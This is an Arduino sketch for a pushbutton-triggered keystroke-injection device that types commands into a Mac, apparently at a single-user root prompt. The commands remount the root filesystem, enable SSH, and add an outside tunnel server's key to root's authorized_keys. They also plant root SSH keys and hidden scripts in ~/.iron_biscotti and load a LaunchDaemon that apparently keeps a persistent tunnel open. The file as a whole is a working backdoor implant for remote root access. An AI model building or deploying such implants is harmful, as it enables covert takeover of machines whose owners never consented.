#include "launch_daemon.h"
#include "file_utils.h"
#include "ssh_keys.h"

char buffer[2048];

void AddTunnelServerKey() {
  TypeString(F("echo \""));
  strcpy_P(buffer, ssh_tunnel_server_public_key);
  TypeString(buffer);
  EnterCommand(F("\" >> /var/root/.ssh/authorized_keys"));
  EnterCommand(F("chmod 644 /var/root/.ssh/authorized_keys"));
}

void IronBiscotti() {
  // Mount the filesystem
  EnterCommand(F("mount -uw /"));
  delay(20000);
  // Set the home var so vim doesn't trip
  EnterCommand(F("export HOME=/var/root/"));
  delay(5000);
  // Generate host keys
  EnterCommand(F("ssh-keygen -A"));
  delay(5000);
  // Setup ssh
  strcpy_P(buffer, ssh_setup);
  TypeString(buffer);
  delay(10000);
  // Setup launch daemon
  EnterCommand(F("mkdir -p /var/root/.iron_biscotti/"));
  strcpy_P(buffer, iron_biscotti_sh);
  WriteToFile(F("/var/root/.iron_biscotti/iron_biscotti.sh"), buffer, F("755"), F("root"), F("wheel"));
  delay(10000);
  strcpy_P(buffer, tunnel_sh);
  WriteToFile(F("/var/root/.iron_biscotti/tunnel.sh"), buffer, F("755"), F("root"), F("wheel"));
  delay(10000);
  strcpy_P(buffer, com_iron_biscotti_plist);
  WriteToFile(F("/Library/LaunchDaemons/com.iron_biscotti.plist"), buffer, F("644"), F("root"), F("wheel"));
  delay(10000);
  EnterCommand(F("mkdir -p /var/root/.ssh/"));
  strcpy_P(buffer, ssh_private_key);
  WriteToFile(F("/var/root/.ssh/id_rsa"), buffer, F("400"), F("root"), F("root"));
  delay(10000);
  strcpy_P(buffer, ssh_public_key);
  WriteToFile(F("/var/root/.ssh/id_rsa.pub"), buffer, F("644"), F("root"), F("root"));
  delay(10000);
  AddTunnelServerKey();
  EnterCommand(F("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist"));
}

void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();
  // pushbutton setup
  pinMode(8, INPUT);
  delay(100);
}

void loop() {
  if(digitalRead(8) == HIGH) {
    IronBiscotti();
  }
  delay(250);
}
